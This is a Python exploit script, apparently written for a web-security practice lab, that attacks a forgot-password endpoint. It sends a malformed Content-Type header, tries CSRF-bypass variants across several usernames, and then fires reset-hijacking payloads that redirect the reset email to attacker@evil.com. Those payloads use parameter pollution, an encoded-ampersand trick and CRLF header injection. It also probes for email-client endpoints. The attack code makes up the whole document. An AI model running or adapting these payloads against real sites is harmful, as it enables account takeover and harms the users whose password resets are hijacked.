#!/usr/bin/env python3
import requests
import sys
import json
import time

def exploit_password_reset(lab_url):
    """Exploit the forgot password with malformed Content-Type"""

    session = requests.Session()

    # First, let's check if we can get a session
    print("[*] Getting initial session...")
    login_page = session.get(f"{lab_url}/login")
    print(f"Session cookie: {session.cookies.get('session')}")

    # Access the forgot-password page to see if there's a JS file
    print("\n[*] Checking forgot-password page...")
    forgot_page = session.get(f"{lab_url}/forgot-password")
    print(f"Status: {forgot_page.status_code}")

    # Check if there's a forgot-password.js file
    print("\n[*] Looking for forgot-password.js...")
    js_url = f"{lab_url}/forgot-password.js"
    js_resp = session.get(js_url)
    if js_resp.status_code == 200:
        print("[+] Found forgot-password.js!")
        print("Content snippet:", js_resp.text[:200])

    # Now let's try the exploit with proper headers
    print("\n[*] Testing password reset exploit...")

    reset_url = f"{lab_url}/forgot-password"

    # These headers match what we saw in the working example
    headers = {
        "Content-Type": "x-www-form-urlencoded",  # Malformed!
        "Accept": "*/*",
        "Origin": lab_url,
        "Referer": f"{lab_url}/forgot-password",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty"
    }

    # Test different users
    test_users = ["administrator", "admin", "carlos", "wiener"]

    for username in test_users:
        print(f"\n[*] Testing username: {username}")

        # Try with and without CSRF token
        payloads = [
            f"csrf=dummy&username={username}",
            f"username={username}",
            f"csrf=&username={username}",
        ]

        for payload in payloads:
            print(f"  Payload: {payload}")

            try:
                response = session.post(
                    reset_url,
                    data=payload,
                    headers=headers,
                    allow_redirects=False
                )

                print(f"  Status: {response.status_code}")
                print(f"  Content-Type: {response.headers.get('Content-Type')}")

                # Try to parse as JSON
                try:
                    json_resp = response.json()
                    print(f"  JSON Response: {json.dumps(json_resp, indent=2)}")

                    # Check if we got the email
                    if "result" in json_resp:
                        print(f"  [!!!] GOT EMAIL: {json_resp['result']}")

                        # Now we need to intercept the reset token
                        # The vulnerability might allow us to redirect it
                        print("\n[*] Attempting to hijack reset token...")

                        # Try various parameter pollution techniques
                        hijack_payloads = [
                            f"csrf=&username={username}&result=attacker@evil.com",
                            f"username={username}&email=attacker@evil.com",
                            f"username={username}&username=attacker",
                            f"username={username}%26email=attacker@evil.com",  # URL encoded &
                            f"username={username}%0d%0aemail:attacker@evil.com",  # CRLF injection
                        ]

                        for hijack in hijack_payloads:
                            print(f"\n  Testing hijack: {hijack}")
                            hijack_resp = session.post(
                                reset_url,
                                data=hijack,
                                headers=headers,
                                allow_redirects=False
                            )

                            try:
                                hijack_json = hijack_resp.json()
                                if "result" in hijack_json:
                                    print(f"  Result: {hijack_json['result']}")
                                    if "attacker" in str(hijack_json['result']):
                                        print("  [!!!] Successfully hijacked email!")
                            except:
                                pass

                        return True

                except json.JSONDecodeError:
                    if response.text:
                        print(f"  HTML Response: {response.text[:200]}")
                except Exception as e:
                    print(f"  Error parsing response: {e}")

            except Exception as e:
                print(f"  Request failed: {e}")

    # Check if there's an email client or any way to intercept emails
    print("\n[*] Checking for email client...")
    email_endpoints = ["/email", "/emails", "/mail", "/email-client"]
    for endpoint in email_endpoints:
        resp = session.get(f"{lab_url}{endpoint}", allow_redirects=False)
        if resp.status_code in [200, 301, 302, 401, 403]:
            print(f"[+] Found {endpoint}: {resp.status_code}")

    return False

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <lab_url>")
        sys.exit(1)

    lab_url = sys.argv[1].rstrip('/')
    exploit_password_reset(lab_url)